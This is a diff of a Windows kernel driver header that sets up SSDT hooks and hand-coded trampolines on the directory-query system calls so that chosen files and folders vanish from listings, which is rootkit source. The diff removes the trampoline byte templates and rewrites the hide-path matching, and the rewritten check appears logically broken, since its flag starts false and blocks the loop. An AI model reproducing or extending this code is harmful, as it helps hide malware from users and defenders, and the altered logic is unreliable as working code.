@@ -1,10 +1,9 @@
 #pragma once
 #pragma warning(disable : 4996)
 #include <wdm.h>
-#include <intrin.h>
 
 
-
+// SSDT Hook global variables and definitions:
 typedef struct _SYSTEM_SERVICE_TABLE{
     PVOID ServiceTableBase;
     PVOID ServiceCounterTableBase;
@@ -12,28 +11,10 @@ typedef struct _SYSTEM_SERVICE_TABLE{
     PVOID ParamTableBase;
 } SYSTEM_SERVICE_TABLE, * PSYSTEM_SERVICE_TABLE;
 
-
 PSYSTEM_SERVICE_TABLE KiServiceDescriptorTable = NULL;
 PVOID KernelImageBaseAddress = NULL;
 BYTE* KernelTextSection = NULL;
-
-const ULONG TrampolineSize = 31;
-const ULONG AfterHookOffset = 20;
-BYTE QueryDirFileTemplate[TrampolineSize] = { 0x40, 0x53,  // push rbx
-                                    0x48, 0x83, 0xec, 0x50,  // sub rsp, 50h
-                                    0xf6, 0x9c, 0x24, 0xa0, 0x00, 0x00, 0x00,  // neg byte ptr[rsp + 0A0h]
-                                    0x48, 0x8b, 0xda,  // mov rbx, rdx
-                                    0x1a, 0xc0,  // sbb al, al
-                                    0x49, 0xbd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs r13, afterhookaddr
-                                    0x41, 0xff, 0xe5  // jmp r13 (jmp afterhookaddr)
-};
-BYTE QueryDirFileExTemplate[TrampolineSize] = { 0x4c, 0x8b, 0xdc,  // mov r11, rsp
-                                    0x48, 0x81, 0xec, 0xa8, 0x00, 0x00, 0x00,  // sub rsp, a8h
-                                    0x49, 0x8d, 0x43, 0xd9,  // lea rax,[r11 - 27h]
-                                    0x49, 0x89, 0x43, 0xd0,  // mov qword ptr [r11-30h],rax
-                                    0x49, 0xbd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs r13, afterhookaddr
-                                    0x41, 0xff, 0xe5  // jmp r13 (jmp afterhookaddr)
-};
+ULONG TextSectionSize = 0;
 
 
 // Default memory pool "arrays" to hold original data of all hooks, will include this original data + jmp afterhookaddr (shellcode itself, in 1809 format):
@@ -234,33 +215,6 @@ public:
 HideFileObject HookHide;
 
 
-// Helper functions:
-NTSTATUS InitiateTrampolinePool(ULONG Tag, PVOID* TrampolinePool, ULONG64 AfterHookAddress) {
-    switch (Tag) {
-    case 'HkQr':
-        *TrampolinePool = &OriginalNtQueryDirFile;
-        OriginalNtQueryDirFile = ExAllocatePoolWithTag(NonPagedPool, TrampolineSize, 'TePr');
-        if (OriginalNtQueryDirFile == NULL) {
-            return STATUS_UNSUCCESSFUL;
-        }
-        RtlCopyMemory(OriginalNtQueryDirFile, QueryDirFileTemplate, TrampolineSize);
-        RtlCopyMemory((PVOID)((ULONG64)OriginalNtQueryDirFile + AfterHookOffset), &AfterHookAddress, sizeof(AfterHookAddress));
-        break;
-    case 'HkQx':
-        *TrampolinePool = &OriginalNtQueryDirFileEx;
-        OriginalNtQueryDirFileEx = ExAllocatePoolWithTag(NonPagedPool, TrampolineSize, 'TePx');
-        if (OriginalNtQueryDirFileEx == NULL) {
-            return STATUS_UNSUCCESSFUL;
-        }
-        RtlCopyMemory(OriginalNtQueryDirFileEx, QueryDirFileExTemplate, TrampolineSize);
-        RtlCopyMemory((PVOID)((ULONG64)OriginalNtQueryDirFileEx + AfterHookOffset), &AfterHookAddress, sizeof(AfterHookAddress));
-        break;
-    default: return STATUS_INVALID_PARAMETER;
-    }
-    return STATUS_SUCCESS;
-}
-
-
 DWORD CompareAgainstFiles(PUNICODE_STRING SearchString) {
     UNICODE_STRING CurrentFile = { 0 };
     if (SearchString == NULL || SearchString->Buffer == NULL || 
@@ -309,8 +263,9 @@ void SearchForInitialEvilDir(PUNICODE_STRING Name, BOOL* IsRoot, BOOL* IsSame, D
 BOOL IsToHideRequest(PUNICODE_STRING RequestedDir, PUNICODE_STRING CurrentFile) {
     UNICODE_STRING CurrentHidden = { 0 };
     ULONG CurrentHideOffs = 0;
+    BOOL IsSame = FALSE;
     int BackSlash = -1;
-    int diri = 0;
+    int DirIndex = 0;
     for (ULONG hiddeni = 0; hiddeni < HookHide.HideCount; hiddeni++) {
         HookHide.GetFromHideFile(&CurrentHidden, hiddeni, &CurrentHideOffs);
         for (int namei = 0; namei < CurrentHidden.Length / sizeof(WCHAR); namei++) {
@@ -334,16 +289,22 @@ BOOL IsToHideRequest(PUNICODE_STRING RequestedDir, PUNICODE_STRING CurrentFile) 
 
 
             // Check if path starts with hiding path to verify last case of exact/inner request for hidden file/folder:
-            if (CurrentHidden.Length >= RequestedDir->Length) {
-                for (diri = 0; diri < RequestedDir->Length / sizeof(WCHAR); diri++) {
-                    if (RequestedDir->Buffer[diri] != CurrentHidden.Buffer[diri]) {
-                        break;
+            if (CurrentHidden.Length <= RequestedDir->Length) {
+                for (DirIndex = 0; DirIndex < CurrentHidden.Length / sizeof(WCHAR) && IsSame; DirIndex++) {
+                    if (CurrentHidden.Buffer[DirIndex] != RequestedDir->Buffer[DirIndex]) {
+                        IsSame = FALSE;
                     }
                 }
-                if (diri == RequestedDir->Length / sizeof(WCHAR)) {
-                    DbgPrintEx(0, 0, "KMDFdriver Hooking - File/folder to hide starts/is equal to RequestedDir (FullPath %wZ, RequestedDir %wZ)\n", &CurrentHidden, RequestedDir);
-                    return TRUE;  // Comparison got to the end of RequestDir - until the end, it was equal
+                if (IsSame) {
+                    if (RequestedDir->Buffer[DirIndex] == L'\0' || RequestedDir->Buffer[DirIndex] == L'\\') {
+                        DbgPrintEx(0, 0, "KMDFdriver Hooking - File/folder to hide starts/is equal to RequestedDir (FullPath %wZ, RequestedDir %wZ)\n",
+                            &CurrentHidden, RequestedDir);  // Make sure that directories like nosusfolder1 wont get labeled as evil
+                        return TRUE;  // Comparison got to the end of RequestDir - until the end, it was equal
+                    }
+                    
                 }
+                DirIndex = 0;
+                IsSame = FALSE;
             }
         }
         BackSlash = -1;
